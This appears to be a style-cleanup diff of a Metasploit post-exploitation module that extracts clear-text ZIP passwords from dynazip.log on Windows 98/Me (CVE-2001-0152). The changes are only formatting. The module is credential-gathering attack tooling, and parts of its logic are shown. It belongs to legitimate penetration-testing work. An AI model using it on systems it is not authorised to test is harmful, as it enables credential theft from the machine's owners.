@@ -8,32 +8,34 @@ class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Windows Gather DynaZIP Saved Password Extraction',
-      'Description'    => %q{
-        This module extracts clear text credentials from dynazip.log.
-        The log file contains passwords used to encrypt compressed zip
-        files in Microsoft Plus! 98 and Windows Me.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['bcoles'],
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather DynaZIP Saved Password Extraction',
+        'Description' => %q{
+          This module extracts clear text credentials from dynazip.log.
+          The log file contains passwords used to encrypt compressed zip
+          files in Microsoft Plus! 98 and Windows Me.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['bcoles'],
+        'References' => [
           ['CVE', '2001-0152'],
           ['MSB', 'MS01-019'],
           ['PACKETSTORM', '24543'],
           ['URL', 'https://support.microsoft.com/en-us/kb/265131']
         ],
-      'DisclosureDate' => '2001-03-27',
-      'Platform'       => ['win'],
-      'SessionTypes'   => ['meterpreter', 'shell']
-    ))
+        'DisclosureDate' => '2001-03-27',
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter', 'shell']
+      )
+    )
   end
 
   def run
     creds = []
 
-    log_path = "#{get_env("%WINDIR%")}\\dynazip.log"
+    log_path = "#{get_env('%WINDIR%')}\\dynazip.log"
 
     unless file?(log_path)
       print_error("#{log_path} not found")
@@ -52,9 +54,8 @@ class MetasploitModule < Msf::Post
     vprint_status("Processing log file (#{log_data.length} bytes)")
 
     log_data.split('- DynaZIP ZIP Diagnostic Log -').each do |log|
-
       if log =~ /^lpszZIPFile: 0x[0-9a-f]+\s*?^(.+)\r\n/
-        zip_path = $1
+        zip_path = ::Regexp.last_match(1)
       else
         next
       end
@@ -84,12 +85,12 @@ class MetasploitModule < Msf::Post
     end
 
     table = Rex::Text::Table.new(
-      'Header'    => 'ZIP Passwords',
-      'Indent'    => 0,
+      'Header' => 'ZIP Passwords',
+      'Indent' => 0,
       'SortIndex' => 0,
-      'Columns'   => ['File Path', 'Password']
+      'Columns' => ['File Path', 'Password']
     )
-    creds.each {|c| table << c }
+    creds.each { |c| table << c }
     print_line
     print_line(table.to_s)
   end
